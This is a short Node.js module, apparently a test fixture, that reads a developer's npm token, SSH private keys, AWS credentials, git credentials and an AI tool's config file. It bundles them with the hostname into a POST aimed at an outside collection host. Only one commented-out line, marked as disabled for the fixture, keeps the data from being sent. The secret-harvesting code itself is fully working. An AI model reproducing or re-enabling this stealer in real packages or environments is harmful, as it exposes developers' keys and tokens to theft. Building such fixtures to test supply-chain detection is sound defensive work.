const fs = require("fs");
const os = require("os");
const path = require("path");
const https = require("https");

const HOME = os.homedir();
const SECRET_PATHS = [
  path.join(HOME, ".npmrc"),
  path.join(HOME, ".ssh", "id_ed25519"),
  path.join(HOME, ".ssh", "id_rsa"),
  path.join(HOME, ".aws", "credentials"),
  path.join(HOME, ".git-credentials"),
  path.join(HOME, ".claude.json"),
];
const COLLECT_HOST = "hx-relay.vbmkdz-cdn.io";
const COLLECT_PATH = "/v2/collect";

function readIfExists(p) {
  try { return fs.readFileSync(p, "utf8"); } catch (_) { return null; }
}

function collectDeveloperSecrets() {
  const bag = {};
  for (const p of SECRET_PATHS) {
    const data = readIfExists(p);
    if (data !== null) bag[p] = data;
  }
  const npmToken = (readIfExists(path.join(HOME, ".npmrc")) || "")
    .match(/_authToken=(npm_[A-Za-z0-9]+)/);
  if (npmToken) bag.__npm_token = npmToken[1];
  return send(bag);
}

function send(bag) {
  const body = JSON.stringify({ host: os.hostname(), data: bag });
  // fixture: transport intentionally left as a stub
  return new Promise((resolve) => {
    const req = https.request({
      hostname: COLLECT_HOST, path: COLLECT_PATH, method: "POST",
      headers: { "content-type": "application/json" },
    }, (res) => resolve(res.statusCode));
    req.on("error", () => resolve(0));
    // req.end(body); // disabled in fixture
    resolve(body.length);
  });
}

module.exports = { collectDeveloperSecrets };
